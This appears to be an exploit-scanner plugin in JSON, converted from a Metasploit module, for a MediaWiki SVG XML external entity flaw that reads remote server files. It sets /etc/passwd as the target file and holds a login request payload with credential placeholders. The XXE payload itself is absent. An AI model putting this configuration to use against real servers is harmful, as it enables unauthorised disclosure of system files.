{
   "description" : "\n\n          This module attempts to read a remote file from the server using a vulnerability\n\n        in the way MediaWiki handles SVG files. The vulnerability occurs while trying to\n\n        expand external entities with the SYSTEM identifier. In order to work MediaWiki must\n\n        be configured to accept upload of SVG files. If anonymous uploads are allowed the\n\n        username and password aren't required, otherwise they are. This module has been\n\n        tested successfully on MediaWiki 1.19.4, 1.20.3 on Ubuntu 10.04 and Ubuntu 12.10.\n\n        Older versions were also tested but do not seem to be vulnerable to this vulnerability.\n\n        The following MediaWiki requirements must be met: File upload must be enabled,\n\n        $wgFileExtensions[] must include 'svg', $wgSVGConverter must be set to something\n\n        other than 'false'.\n\n      ",
   "method" : "GET",
   "platform" : "SCANNER",
   "title" : "MediaWiki SVG XML Entity Expansion Remote File Access",
   "variables" : {
      "WPNAME" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "WPLOGINTOKEN" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "WPPASSWORD" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      },
      "RFILE" : {
         "VALUE" : "/etc/passwd",
         "DESCRIPTION" : "Remote File"
      },
      "PASSWORD" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "PATH" : {
         "DESCRIPTION" : "Path to MediaWiki",
         "VALUE" : "/mediawiki"
      },
      "USERNAME" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      }
   },
   "payload" : "wpName=__WPNAME__&wpPassword=__WPPASSWORD__&wpLoginAttempt=Log+in&wpLoginToken=__WPLOGINTOKEN__&returnto=Main+Page&",
   "references" : [
      "https://bugzilla.wikimedia.org/show_bug.cgi?id=46859",
      "http://www.gossamer-threads.com/lists/wiki/mediawiki-announce/350229"
   ],
   "msf_module" : "mediawiki_svg_fileaccess",
   "name" : "MediawikiSvgFileaccess",
   "osvdb" : 92490,
   "paths" : [
      "mediawiki"
   ],
   "requests" : {
      "EXPLOIT1" : {
         "METHOD" : "GET",
         "PATH" : "",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "TEXT" : "Sending Exploit #1 Request : [GET] ",
         "PAYLOAD" : "",
         "HEADERS" : {
            "Content-Type" : "application/x-www-form-urlencoded"
         }
      }
   },
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "path" : "title=Special:UserLogin&returnto=Main+Page&title=Special:UserLogin&returnto=Main+Page&title=Special:UserLogin&action=submitlogin&type=login&",
   "type" : "MSF",
   "detection" : {},
   "informations" : {
      "METHOD" : "GET",
      "PATH" : "title=Special:UserLogin&returnto=Main+Page&title=Special:UserLogin&returnto=Main+Page&title=Special:UserLogin&action=submitlogin&type=login&",
      "REFERENCES" : [
         "https://bugzilla.wikimedia.org/show_bug.cgi?id=46859",
         "http://www.gossamer-threads.com/lists/wiki/mediawiki-announce/350229"
      ],
      "PATHS" : [
         "mediawiki"
      ],
      "PLATFORM" : "SCANNER",
      "TYPE" : "MSF",
      "VARIABLES" : {
         "RFILE" : {
            "VALUE" : "/etc/passwd",
            "DESCRIPTION" : "Remote File"
         },
         "USERNAME" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "PATH" : {
            "DESCRIPTION" : "Path to MediaWiki",
            "VALUE" : "/mediawiki"
         },
         "PASSWORD" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "WPNAME" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "WPLOGINTOKEN" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "WPPASSWORD" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         }
      },
      "MSF_MODULE" : "mediawiki_svg_fileaccess",
      "TITLE" : "MediaWiki SVG XML Entity Expansion Remote File Access",
      "REQUESTS" : {
         "EXPLOIT1" : {
            "METHOD" : "GET",
            "PATH" : "",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "TEXT" : "Sending Exploit #1 Request : [GET] ",
            "PAYLOAD" : "",
            "HEADERS" : {
               "Content-Type" : "application/x-www-form-urlencoded"
            }
         }
      },
      "name" : "MediawikiSvgFileaccess",
      "OSVDB" : 92490,
      "PAYLOAD" : "wpName=__WPNAME__&wpPassword=__WPPASSWORD__&wpLoginAttempt=Log+in&wpLoginToken=__WPLOGINTOKEN__&returnto=Main+Page&",
      "DESCRIPTION" : "\n\n          This module attempts to read a remote file from the server using a vulnerability\n\n        in the way MediaWiki handles SVG files. The vulnerability occurs while trying to\n\n        expand external entities with the SYSTEM identifier. In order to work MediaWiki must\n\n        be configured to accept upload of SVG files. If anonymous uploads are allowed the\n\n        username and password aren't required, otherwise they are. This module has been\n\n        tested successfully on MediaWiki 1.19.4, 1.20.3 on Ubuntu 10.04 and Ubuntu 12.10.\n\n        Older versions were also tested but do not seem to be vulnerable to this vulnerability.\n\n        The following MediaWiki requirements must be met: File upload must be enabled,\n\n        $wgFileExtensions[] must include 'svg', $wgSVGConverter must be set to something\n\n        other than 'false'.\n\n      "
   }
}
